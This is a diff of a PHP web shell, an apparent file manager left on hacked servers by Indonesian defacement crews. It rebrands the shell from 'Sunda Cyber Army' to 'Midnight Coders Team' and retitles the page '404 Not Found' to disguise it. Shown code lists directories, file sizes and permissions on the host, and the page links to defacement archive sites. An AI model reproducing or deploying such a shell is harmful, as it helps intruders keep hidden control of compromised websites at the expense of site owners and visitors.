@@ -9,11 +9,11 @@ $_POST[$key] = stripslashes($value);
 }
 echo '<!DOCTYPE HTML>
 <html>
-<iframe width="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="https://e.top4top.net/m_1090veecd1.mp3"></iframe>
+
 <head>
-<body bgcolor="black"><center><audio autoplay="autoplay" controls="controls" src="https://afad.yxwz.xyz/@download/140-5c162875eae2b-57768000-2407-192-m4a-38230393/mp3/zn0l0TuwLrU/Karaoke%2BLagu%2BSunda%2BKenangan%2BNonstop.mp3" type="audio/mpeg"></audio>
+<body bgcolor="black"><center>
 <link href="" rel="stylesheet" type="text/json_decode">
-<title>Sunda Cyber Army</title>
+<title>404 Not Found</title>
 <style>
 body{
 background-colour: green;
@@ -47,23 +47,22 @@ border-radius:5px;
 </head>
 <body>
      <center><br><br>
-    	<img border="0" src="https://seken.co.id/assets/uploads/post/Monkey-de-Luffy-One-Piece-81.jpg" width="270" height="240">
+    	<img border="0" src="https://i.pinimg.com/originals/47/84/07/478407b8d60fad5fe01d47f91c9a44f2.jpg" width="270" height="240">
       </center>
-    <h3><font color="red" MisterD | Sunda Cyber Army </h3></font.
+    <h3><font color="red" LulNazi | Midnight Coders </h3></font.
     <div class="greetings">
-        * Sunda Cyber Army 2k17 *
+        * Midnight Coders Team 2020 *
     </div><br>
         Indonesia Defacer ~ <br><br>
-    <div class="barlink">
-Ã‚Â© | <a href="https://www.facebook.com/SundaCyberArmy/">FaceBook</a> |   
-	<a href="https://www.youtube.com/channel/UCJl5SuxvQ6C0uX4uYNGLAxg/videos?view_as=subscriber">Youtube</a> | Ã‚Â©
+    <div class="barlink">© | <a href="https://www.facebook.com/amzah.su/">Facebook</a> |   
+	<a href="https://www.youtube.com/channel/UChO0kbRsmIlR2fqp9D8DvPQ/videos?view_as=subscriber">Youtube</a> | ©
 	<br>
-	?? | <a href="https://hackersid.com/archive/team/sunda-cyber-army/1">HackersId</a> | 
-	<a href="https://defacer.id/archive/team/sunda-cyber-army">DefacerId</a> | ??
+	 | <a href="https://zone-xsec.com/search/q=Midnight+Coders+Team/1">Zone-Xsec</a> | 
+	<a href="https://defacer.id/archive/team/midnight-coders-team">DefacerId</a> | 
 	<br>
-?? | <a href="https://www.xploiters77.ml/">Website</a> | ??
+ | <a href="index.php">Website Target</a> | 
     	<br>
-?? | <a href="http://scaxploiters77.cf">Tools</a> | ??
+ | <a href="#">Tools</a> | 
     </div><br>
 <table width="770" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td><font color="white">Path :</font> ';
@@ -177,10 +176,10 @@ echo '</center>';
 $scandir = scandir($path);
 echo '<div id="content"><table width="800" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr class="first">
-<td><center>Nama nya :)</SCA></center></td>
-<td><center>Ukuran Nya :)</SCA></center></td>
+<td><center>Nama nya :)</MCT></center></td>
+<td><center>Ukuran Nya :)</MCT></center></td>
 <td><center>Permission Nya Coy :)</peller></center></td>
-<td><center>Memodifikasi Nya :)</SCA></center></td>
+<td><center>Memodifikasi Nya :)</MCT></center></td>
 </tr>';
 
 foreach($scandir as $dir){
@@ -247,7 +246,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo '<center><br/><size="6"Sunda Cyber Army Since 2K17</center>
+echo '<center><br/><size="6"Midnight Coders Team | Since 2K19</center>
 </body>
 </html>';
 function perms($file){
